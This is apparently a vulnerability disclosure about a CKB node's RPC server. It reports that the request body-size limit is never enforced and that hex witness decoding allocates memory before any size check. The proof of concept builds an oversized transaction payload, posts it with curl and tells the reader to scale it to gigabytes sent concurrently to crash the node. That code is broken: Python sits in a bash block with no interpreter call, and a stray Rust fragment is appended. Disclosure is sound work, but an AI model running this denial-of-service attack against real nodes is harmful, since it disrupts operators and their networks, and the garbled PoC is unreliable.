### Title
Unenforced `max_request_body_size` + Unbounded `JsonBytes` Heap Allocation Before `SizeVerifier` Enables RPC-Level OOM — (`rpc/src/server.rs`, `util/jsonrpc-types/src/bytes.rs`)

### Summary
The `max_request_body_size` config (default 10 MiB) is declared and documented but is **never wired into the axum HTTP server** as a body-limit layer. As a result, an unprivileged caller can POST an arbitrarily large JSON body. During deserialization of a `Transaction`, `JsonBytes::visit_str` allocates a heap buffer of `(hex_len - 2) / 2` bytes with no pre-check. `SizeVerifier` only runs after the full allocation succeeds. Repeated requests exhaust node heap memory before any consensus guard fires.

### Finding Description
`RpcServer::start_server` builds an axum `Router` with `CorsLayer` and `TimeoutLayer` but applies no `tower_http::limit::RequestBodyLimitLayer` or `axum::extract::DefaultBodyLimit`. The `config.max_request_body_size` value is read from config but never passed to the router. [6](#0-5) 

The `handle_jsonrpc` handler receives `req_body: Bytes` — the full, unbounded body — and immediately calls `serde_json::from_str::<Request>(req)`. During deserialization of the `witnesses` array, each element is a `JsonBytes`, whose `visit_str` does:

```rust
let mut buffer = vec![0; bytes.len() >> 1]; // line 104
hex_decode(bytes, &mut buffer)...
``` [3](#0-2) 

Only after this allocation completes does the code path reach `non_contextual_verify` → `SizeVerifier::verify`, which checks against `consensus.max_block_bytes()` (~500 KB) and `TRANSACTION_SIZE_LIMIT` (512 KB). [7](#0-6) 

### Impact Explanation
A single request with `witnesses: ["0x" + "00" * 2_000_000_000]` (a ~2 GB hex string, ~1 GB decoded) causes the RPC thread to allocate ~1 GB before returning an error. Concurrent requests from multiple connections multiply this. The node OOMs or the allocator stalls the async runtime, blocking all RPC and potentially P2P processing, congesting the network.

### Likelihood Explanation
The RPC endpoint is HTTP, reachable by any unprivileged caller with network access. The default config binds to `127.0.0.1:8114`, but many operators expose this publicly or via reverse proxy. No authentication, PoW, or rate-limit is required. The attack is trivially scriptable with `curl`.

### Recommendation
Apply `tower_http::limit::RequestBodyLimitLayer` (or axum's `DefaultBodyLimit::max(config.max_request_body_size)`) to the axum router in `start_server`. Additionally, add a length pre-check in `JsonBytes::visit_str` before allocating the buffer, rejecting inputs whose decoded size would exceed a reasonable bound (e.g., `TRANSACTION_SIZE_LIMIT`).

### Proof of Concept
```bash
# Generate ~20 MiB witness (exceeds default 10 MiB limit that is NOT enforced)

import json, sys
witness = '0x' + '00' * (20 * 1024 * 1024)
tx = {
  'version': '0x0', 'cell_deps': [], 'header_deps': [],
  'inputs': [{'previous_output': {'tx_hash': '0x' + '00'*32, 'index': '0x0'}, 'since': '0x0'}],
  'outputs': [{'capacity': '0x2540be400', 'lock': {'code_hash': '0x' + '00'*32, 'hash_type': 'data', 'args': '0x'}, 'type': None}],
  'outputs_data': ['0x'],
  'witnesses': [witness]
}
print(json.dumps({'id': 1, 'jsonrpc': '2.0', 'method': 'send_transaction', 'params': [tx, 'passthrough']}))
" > /tmp/big_tx.json

# Measure RSS before
ps -o rss= -p $(pgrep ckb) 

curl -s -X POST -H 'Content-Type: application/json' \
     --data-binary @/tmp/big_tx.json \
     http://127.0.0.1:8114/

# Measure RSS after — expect spike of ~10 MB per request, no 413 returned
ps -o rss= -p $(pgrep ckb)
```

Scale the witness to 1 GB hex and repeat concurrently to trigger OOM. The node will not return HTTP 413 because no body-size limit is enforced.

pub(crate) fn non_contextual_verify(
    consensus: &Consensus,
    tx: &TransactionView,
) -> Result<(), Reject> {
    NonContextualTransactionVerifier::new(tx, consensus)
        .verify()
        .map_err(Reject::Verification)?;

    // The ckb consensus does not limit the size of a single transaction,
    // but if the size of the transaction is close to the limit of the block,
    // it may cause the transaction to fail to be packed
    let tx_size = tx.data().serialized_size_in_block() as u64;
    if tx_size > TRANSACTION_SIZE_LIMIT {
        return Err(Reject::ExceededTransactionSizeLimit(
            tx_size,
            TRANSACTION_SIZE_LIMIT,
        ));
    }
